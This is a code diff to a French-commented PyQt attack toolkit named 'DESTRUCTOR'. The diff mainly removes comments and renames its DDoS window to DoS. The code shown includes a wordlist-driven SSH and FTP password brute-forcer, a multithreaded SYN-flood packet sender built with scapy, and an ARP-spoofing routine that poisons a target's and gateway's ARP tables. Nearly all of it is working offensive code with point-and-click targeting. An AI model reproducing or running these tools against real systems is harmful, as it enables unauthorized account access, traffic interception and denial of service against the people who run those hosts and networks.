@@ -177,11 +177,9 @@ class BruteForceWindow(QWidget):
         self.setLayout(layout)
 
     def set_port(self, port):
-        """ Définit le port sélectionné dans le champ de port. """
         self.port_input.setText(str(port))
 
     def browse_passwords(self):
-        """ Permet de sélectionner un fichier contenant les mots de passe. """
         options = QFileDialog.Options()
         password_file, _ = QFileDialog.getOpenFileName(
             self, "Sélectionner un fichier de mots de passe", "", "Text Files (*.txt);;All Files (*)", options=options
@@ -190,7 +188,6 @@ class BruteForceWindow(QWidget):
             self.password_file_input.setText(password_file)
 
     def run_brute_force(self):
-        """ Exécute le processus de brute force avec les informations fournies. """
         ip = self.ip_input.text()
         port = self.port_input.text() or "22"  # Port par défaut : 22
         user = self.user_input.text()
@@ -237,7 +234,6 @@ class BruteForceWindow(QWidget):
             QMessageBox.warning(self, "Erreur", f"Une erreur est survenue : {str(e)}")
 
     def attempt_connection(self, ip, port, user, password):
-        """ Tente une connexion SSH ou FTP. """
         if port == 22:
             if self.ssh_brute_force(ip, port, user, password):
                 return password
@@ -247,7 +243,6 @@ class BruteForceWindow(QWidget):
         return None
 
     def ssh_brute_force(self, ip, port, user, password):
-        """ Tente une connexion SSH avec Paramiko. """
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
@@ -265,7 +260,6 @@ class BruteForceWindow(QWidget):
             return False
 
     def ftp_brute_force(self, ip, port, user, password):
-        """ Tente une connexion FTP avec le module ftplib. """
         try:
             ftp = FTP()
             ftp.connect(ip, port, timeout=5)
@@ -279,10 +273,10 @@ class BruteForceWindow(QWidget):
             print(f"Erreur de connexion FTP : {str(e)}")
             return False
 
-class DDoSWindow(QWidget):
+class DoSWindow(QWidget):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("DDoS Attack")
+        self.setWindowTitle("DoS Attack")
         self.setGeometry(150, 150, 400, 400)
         self.initUI()
 
@@ -293,9 +287,9 @@ class DDoSWindow(QWidget):
         self.target_input.setPlaceholderText("Entrez l'adresse IP cible")
         layout.addWidget(self.target_input)
 
-        self.btn_execute_ddos = QPushButton("Exécuter DDoS")
-        self.btn_execute_ddos.clicked.connect(self.execute_ddos)
-        layout.addWidget(self.btn_execute_ddos)
+        self.btn_execute_dos = QPushButton("Exécuter DoS")
+        self.btn_execute_dos.clicked.connect(self.execute_dos)
+        layout.addWidget(self.btn_execute_dos)
 
         self.setLayout(layout)
 
@@ -303,13 +297,13 @@ class DDoSWindow(QWidget):
         pkt = IP(dst=target) / TCP(dport=80, flags="S")
         send(pkt, verbose=0)
 
-    def execute_ddos(self):
+    def execute_dos(self):
         target = self.target_input.text()
         if not target:
             QMessageBox.warning(self, "Erreur", "Veuillez entrer une adresse IP cible.")
             return
 
-        # Logique DDoS 
+        # Logique DoS 
         try:
             start_time = time.time()  # Mesurer le temps d'exécution
             with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:  # Ajuster le nombre de threads
@@ -318,9 +312,9 @@ class DDoSWindow(QWidget):
                     pass  # Just wait for the threads to finish
 
             elapsed_time = time.time() - start_time
-            QMessageBox.information(self, "DDoS", f"DDoS envoyé vers {target}.\nTemps écoulé : {elapsed_time:.2f} secondes.")
+            QMessageBox.information(self, "DoS", f"DoS envoyé vers {target}.\nTemps écoulé : {elapsed_time:.2f} secondes.")
         except Exception as e:
-            QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution du DDoS : {str(e)}")
+            QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution du DoS : {str(e)}")
 
 
 class ARPSpoofingWindow(QWidget):
@@ -354,12 +348,10 @@ class ARPSpoofingWindow(QWidget):
             QMessageBox.warning(self, "Erreur", "Veuillez entrer les adresses IP.")
             return
 
-        # Logique ARP Spoofing
         try:
             target_mac = getmacbyip(target_ip)
             gateway_mac = getmacbyip(gateway_ip)
 
-            # Envoi des paquets ARP
             arp_poisoning_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=target_mac)
             arp_poisoning_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac)
 
@@ -368,23 +360,17 @@ class ARPSpoofingWindow(QWidget):
 
             QMessageBox.information(self, "ARP Spoofing", "ARP Spoofing exécuté.")
             
-        # Restauration des entrées ARP
             self.reset_arp_cache(target_ip, target_mac, gateway_ip, gateway_mac)
             QMessageBox.information(self, "ARP Spoofing", "Tables ARP restaurées.")
         except Exception as e:
             QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution de l'ARP Spoofing : {str(e)}")
 
     def reset_arp_cache(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
-        """
-        Restaure les tables ARP des cibles avec les bonnes associations IP-MAC.
-        """
+
         try:
-            # Restauration côté victime
             restore_victim = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac)
-            # Restauration côté passerelle
             restore_gateway = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac)
 
-            # Envoi des paquets correctifs
             send(restore_victim, count=3, verbose=0)
             send(restore_gateway, count=3, verbose=0)
         except Exception as e:
@@ -403,7 +389,6 @@ class MainWindow(QMainWindow):
 
         layout.setContentsMargins(20, 20, 20, 20) 
 
-        # Application name
         app_name_label = QLabel("DESTRUCTOR") 
         app_name_label.setAlignment(Qt.AlignCenter)
         app_name_label.setStyleSheet("font-family: 'Courier New'; font-size: 24px; color: red; font-weight: bold;") 
@@ -419,9 +404,9 @@ class MainWindow(QMainWindow):
         btn_brute_force.clicked.connect(self.open_brute_force)
         layout.addWidget(btn_brute_force)
 
-        btn_ddos = QPushButton("DDoS", self)
-        btn_ddos.clicked.connect(self.open_ddos)
-        layout.addWidget(btn_ddos)
+        btn_dos = QPushButton("DoS", self)
+        btn_dos.clicked.connect(self.open_dos)
+        layout.addWidget(btn_dos)
 
         btn_arp_spoofing = QPushButton("ARP Spoofing", self)
         btn_arp_spoofing.clicked.connect(self.open_arp_spoofing)
@@ -433,7 +418,6 @@ class MainWindow(QMainWindow):
 
         layout.addSpacing(20)
 
-        # Créateurs
         creators_label = QLabel("MADE BY : TP - ES - LU")
         creators_label.setAlignment(Qt.AlignCenter)
         creators_label.setStyleSheet("font-family: 'Courier New'; font-size: 14px; color: black; font-weight: bold;") 
@@ -455,9 +439,9 @@ class MainWindow(QMainWindow):
         self.brute_force_window = BruteForceWindow()
         self.brute_force_window.show()
 
-    def open_ddos(self):
-        self.ddos_window = DDoSWindow()
-        self.ddos_window.show()
+    def open_dos(self):
+        self.dos_window = DoSWindow()
+        self.dos_window.show()
 
     def open_arp_spoofing(self):
         self.arp_spoofing_window = ARPSpoofingWindow()
@@ -468,8 +452,8 @@ class MainWindow(QMainWindow):
         self.port_scan_window.show()
         self.brute_force_window = BruteForceWindow()
         self.brute_force_window.show()
-        self.ddos_window = DDoSWindow()
-        self.ddos_window.show()
+        self.dos_window = DoSWindow()
+        self.dos_window.show()
         self.arp_spoofing_window = ARPSpoofingWindow()
         self.arp_spoofing_window.show()
 
